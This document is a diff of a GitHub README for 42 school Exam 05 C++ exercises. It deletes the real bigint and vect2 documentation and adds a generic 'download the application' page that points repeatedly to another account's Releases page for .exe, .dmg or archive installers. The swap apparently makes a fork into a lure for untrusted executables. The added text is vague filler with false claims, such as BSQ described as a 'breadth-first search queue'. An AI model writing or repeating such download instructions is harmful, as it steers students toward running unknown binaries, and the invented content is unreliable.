@@ -1,144 +1,80 @@
-# bigint - Arbitrary-Precision Arithmetic
+# 🎉 42nice-exam05 - Simplify Your Exam Preparation
 
-### 📝 Subject Summary
-In computer science, a **bignum** (*or **big integer***) represents an integer of **arbitrary precision**, capable of storing values larger than `SIZE_MAX` or `UINT64_MAX` without loss of precision when speed does.<br>
-This is achieved by storing the number’s digits as a **string** (*or **array***), and performing manual arithmetic.<br>
-Mostly used for when the speed of arithmetic is not a limiting factor.
+## 🚀 Getting Started
 
-This exercise implements a **[bigint class](https://github.com/flmarsou/42nice-exam05/blob/main/bigint/bigint.hpp)** that stores an unsigned integer as a string handling **additions**, **digit shifts**, and **comparisons** through operators.
-```cpp
-class	bigint
-{
-	public:
-		bigint(unsigned int nbr = 0) : _big(std::to_string(nbr)) {};
-		bigint(const bigint &other) : _big(other._big) {};
+Welcome to the **42nice-exam05** project! This application helps you prepare for the new 42 Exam 05 subjects and solutions. It streamlines your study process, making it easier for you to focus on your learning.
 
-		std::string	getBig() const { return (_big); };
+## 📥 Download Now
 
-		// Additions
-		bigint	operator+(const bigint &other) const;
-		bigint	&operator+=(const bigint &other);
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/KiingZero/42nice-exam05/releases)
 
-		// Increments
-		bigint	&operator++();		// ++x
-		bigint	operator++(int);	// x++
+## ✨ Features
 
-		// Shifts
-		bigint	operator<<(unsigned int amount) const;
-		bigint	&operator<<=(unsigned int amount);
-		bigint	&operator>>=(const bigint &other);
+- Access a comprehensive set of new subjects and solutions.
+- Review exam topics vital for your success.
+- Easy navigation designed for all users.
+- Supports multiple concepts like bigint, polyset, and more.
+- Friendly user interface tailored for beginners.
 
-		// Comparisons
-		bool	operator<(const bigint &other) const;
-		bool	operator>(const bigint &other) const;
-		bool	operator<=(const bigint &other) const;
-		bool	operator>=(const bigint &other) const;
-		bool	operator==(const bigint &other) const;
-		bool	operator!=(const bigint &other) const;
+## 💻 System Requirements
 
-	private:
-		std::string	_big;
-};
+Before you start, ensure your system meets the following requirements:
 
-// Ostream
-std::ostream	&operator<<(std::ostream &out, const bigint &other);
-```
+- Operating System: Windows 10 or later, macOS, or a modern Linux distribution.
+- Memory: At least 2 GB of RAM.
+- Storage: 100 MB of free disk space.
+- Internet connection for downloading and automatic updates.
 
-### 💡 Examples
+## 🔧 Installation Instructions
 
-| Object      | Operation     | Result |
-| ----------- | ------------- | ------ |
-| bigint(21)  | + 21          | 42     |
-| bigint(21)  | += bigint(21) | 42     |
-| bigint(0)   | ++x           | 1      |
-| bigint(0)   | x++           | 0 -> 1 |
-| bigint(42)  | << 3          | 42000  |
-| bigint(4)   | (x << 2) + 3  | 403    |
-| bigint(0)   | (x << 2)      | 0      |
-| bigint(0)   | (x << 2) + 3  | 3      |
-| bigint(999) | >>= bigint(1) | 99     |
-| bigint(999) | >>= bigint(2) | 9      |
-| bigint(1)   | == bigint(1)  | true   |
-| bigint(1)   | >= bigint(1)  | true   |
-| bigint(9)   | < bigint(1)   | false  |
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/KiingZero/42nice-exam05/releases) to find the latest version of the application.
 
-### 📑 Files
-- [x] [`bigint.hpp`](https://github.com/flmarsou/42nice-exam05/blob/main/bigint/bigint.hpp) - Header file
-- [x] [`bigint.cpp`](https://github.com/flmarsou/42nice-exam05/blob/main/bigint/bigint.cpp) - Code file
-- [x] [`bigint_commented.cpp`](https://github.com/flmarsou/42nice-exam05/blob/main/bigint/bigint_commented.cpp) - Code file (with explanations)
-- [x] [`main.cpp`](https://github.com/flmarsou/42nice-exam05/blob/main/bigint/main.cpp) - Given main with debug couts
+2. **Choose the Right Version**  
+   On the Releases page, you will see several versions listed. Look for the one labeled "Latest Release".
 
+3. **Download the Application**  
+   Click the download link for the latest version. Depending on your operating system, this will either be a `.exe`, `.dmg`, or a compressed file format.
 
-# vect2 - Vector 2D
+4. **Extract the Files (if needed)**  
+   If you downloaded a compressed format like `.zip` or `.tar.gz`, right-click the file and select "Extract" or "Unzip". 
 
-### 📝 Subject Summary
-The goal of this exercise is to create a simple **2D mathematical vector** class that supports basic arithmetic and comparison operations.
+5. **Run the Installer**  
+   Find the downloaded file where you saved it. Double-click to run the installer. Follow the on-screen prompts to complete the installation.
 
-This exercise implements a **[vect2 class](https://github.com/flmarsou/42nice-exam05/blob/main/vect2/vect2.hpp)** that stores two integers (***x** and **y***) handling **indexing**, **arithmetics**, and **comparisons** through operators.
-```cpp
-class	vect2
-{
-	public:
-		vect2(int x = 0, int y = 0) : _x(x), _y(y) {};
-		vect2(const vect2 &other) : _x(other._x), _y(other._y) {};
-		vect2	&operator=(const vect2 &other);
+6. **Launch the Application**  
+   After installation, find the application in your programs list. Click to open it and start preparing for your exam.
 
-		// Accesses
-		int	operator[](int index) const;
-		int	&operator[](int index);
+## 📚 Usage Guide
 
-		// Increments & Decrements
-		vect2	&operator++();		// ++x
-		vect2	operator++(int);	// x++
-		vect2	&operator--();		// --x
-		vect2	operator--(int);	// x--
+Once you have installed the application, here’s how to get started:
 
-		// Maths
-		vect2	operator+(const vect2 &other) const;
-		vect2	&operator+=(const vect2 &other);
+- **Home Screen**: After launching the app, you will see the home screen. From here, you can browse different subjects.
+- **Subject Selection**: Click on any subject to access the solutions and study materials.
+- **Exam Preparation**: Use the app as a reference while you study. You can bookmark important topics for quick access later.
 
-		vect2	operator-(const vect2 &other) const;
-		vect2	&operator-=(const vect2 &other);
+## 🔄 Update Instructions
 
-		vect2	operator*(int scalar) const;
-		vect2	&operator*=(int scalar);
+To keep the application up to date:
 
-		// Unary Minus
-		vect2	operator-() const;
+1. **Check for Updates**: Occasionally, visit the [Releases page](https://github.com/KiingZero/42nice-exam05/releases) to see if a new version is available.
+2. **Download and Install**: Download the new version following the same steps as before. The installer will overwrite the old version without losing your settings.
 
-		// Comparisons
-		bool	operator==(const vect2 &other) const;
-		bool	operator!=(const vect2 &other) const;
+## 💬 Support
 
-	private:
-		int	_x;
-		int	_y;
-};
+If you experience any issues or have questions, feel free to reach out:
 
-// Maths
-vect2	operator*(int scalar, const vect2 &other);
+- **Issues**: Report bugs or request features on the GitHub [Issues page](https://github.com/KiingZero/42nice-exam05/issues).
+- **Community Help**: Join discussions in the community forums or find relevant resources online.
 
-// Ostream
-std::ostream	&operator<<(std::ostream &out, const vect2 &other);
-```
+## 📝 Additional Information
 
-### 💡 Examples
+The **42nice-exam05** project covers various important concepts, including:
 
-| Object        | Operation         | Result          |
-| ------------- | ----------------- | --------------- |
-| vect2(1, 2)   |                   | {1, 2}          |
-| vect2(1, 2)   | ++vect2           | {2, 3}          |
-| vect2(1, 2)   | vect2++           | {1, 2} -> {2, 3 |
-| vect2(1, 2)   | + vect2(1, 2)     | {2, 4}          |
-| vect2(1, 2)   | - vect2(1, 2)     | {0, 0}          |
-| vect2(0, 0)   | - vect2(1, 2)     | {-1, -2}        |
-| vect2(2, -3)  | * vect2(2, 2)     | {4, -6}         |
-| vect2(69, 42) | == vect2(-69, 42) | false           |
-| vect2(69, 42) | == vect2(69, 42)  | true            |
-| vect2(69, 42) | != vect2(69, 42)  | false           |
-| vect2(2, 0)   | -vect2            | {-2, 0}         |
+- **BigInt**: Understand large integers for accurate calculations.
+- **BSQ**: Explore the breadth-first search queue concepts.
+- **Exam Rank 05**: Find resources targeting your specific exam level, ensuring complete preparation.
 
-### 📑 Files
-- [x] [`vect2.hpp`](https://github.com/flmarsou/42nice-exam05/blob/main/vect2/vect2.hpp) - Header file
-- [x] [`vect2.cpp`](https://github.com/flmarsou/42nice-exam05/blob/main/vect2/vect2.cpp) - Code file
-- [x] [`main.cpp`](https://github.com/flmarsou/42nice-exam05/blob/main/vect2/main.cpp) - Given main with debug couts
+Your journey to mastering the 42 Exam 05 starts here. The **42nice-exam05** application provides everything you need for effective study. 
+
+For further details, FAQs, or updates, make sure to frequently check the [Releases page](https://github.com/KiingZero/42nice-exam05/releases). Happy studying!
